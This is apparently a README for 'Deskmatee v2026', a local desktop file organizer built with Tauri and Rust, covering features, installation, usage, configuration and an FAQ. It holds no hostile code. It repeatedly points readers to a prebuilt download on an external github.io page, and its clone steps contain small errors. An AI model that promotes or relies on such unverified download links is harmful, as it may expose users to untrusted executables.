# Deskmatee v2026 - Desktop File Organizer 2026

> **Deskmatee v2026 is a Tauri- and Rust-powered desktop organizer that stays on your machine: it inventories local files, attaches smart tags, arranges them into clearer structures, and can optionally surface AI-guided sorting tips.**

[![Platform](https://img.shields.io/badge/Platform-desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bruno-edwards43/deskmatee-desktop-file-hub?style=flat-square)](https://github.com/bruno-edwards43/deskmatee-desktop-file-hub)

---

<p align="center">
  <a href="https://bruno-edwards43.github.io/deskmatee-desktop-file-hub/">
    <img src="https://img.shields.io/badge/Download-Deskmatee%20Latest-brightgreen?style=for-the-badge" alt="Download Deskmatee">
  </a>
</p>

> **[Direct Download - Deskmatee v2026](https://bruno-edwards43.github.io/deskmatee-desktop-file-hub/)**

---

[Download Latest Build](https://bruno-edwards43.github.io/deskmatee-desktop-file-hub/)

---

## What Deskmatee Does

Messy desktops and download dumps are hard to tame by hand. Deskmatee walks chosen folders, pulls metadata, and turns names plus content signals into tags and groupings you can act on. The goal is a repeatable local workflow for large collections—without shipping those files through a cloud pipeline.

Everything runs on the desktop. You get previews, open-with-default-app behavior, and dry-run passes so you can inspect planned moves before anything is relocated. Core sorting relies on rules and classification; an optional AI companion can propose recommendations while you organize.

---

## Capabilities

- Inventory directories and gather metadata for inspection and cleanup
- Group items by type and recurring content patterns
- Derive smart tags from names and in-file cues
- Relocate items into a cleaner folder layout
- Preview content and launch files in the OS default application
- Simulate moves with dry-run before committing
- Stay fully local—no mandatory online path
- Optionally lean on an AI companion for organization suggestions

---

## Installation

Get the source and prepare the desktop stack dependencies, or use a packaged build.

1. Clone:
   - `git clone https://github.com/bruno-edwards43/deskmatee-desktop-file-hub.git
   - `cd deskmatee`
2. Install the Tauri and Rust tooling expected for this project.
3. Launch via the repository’s usual start command, or run the packaged binary you downloaded.

Prefer not to build? Use the download link above and open the package for your system.

---

## Usage

Common path through the app:

1. Start Deskmatee.
2. Pick the folder(s) to scan.
3. Inspect metadata, tags, and type-based groups.
4. Preview, open, or plan a reorganize step.
5. Prefer a dry-run when you want a change list first.
6. Apply moves to drop files into the target tree.

Illustrative session:

- Point a scan at Downloads
- Check tags inferred from names and content patterns
- Preview anything that still needs a human look
- Move chosen files into structured subfolders

---

## Configuration

Settings live in the desktop build’s local config area. Typical knobs include:

- paths included in scans
- how tagging behaves
- content-driven classification
- whether the AI companion is on
- dry-run as the default mode
- destinations and organization rules for moves

Illustrative local settings shape:

{
  "scanPaths": [],
  "dryRun": true,
  "useAiCompanion": false,
  "tagging": {
    "enabled": true
  }
}

---

## Requirements

- A supported desktop environment
- Tauri runtime (dev or packaged)
- Rust toolchain when building from source
- Standard web frontend stack for the HTML/JavaScript UI layer
- Disk room for source files, metadata, and organizer state

---

## FAQ

**Is file handling local-only?**  
Yes. Deskmatee is described as processing on the machine itself.

**Can I rehearse moves before they happen?**  
Yes. Dry-run lets you review the intended actions first.

**Must I enable AI?**  
No. The companion is optional and only supplies recommendations.

**Where do I tune sorting behavior?**  
Use local app configuration—scan targets, tagging, and move-related options.

**Organization looks wrong—what next?**  
Use preview and metadata views, then dry-run so you can see classification before applying moves.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
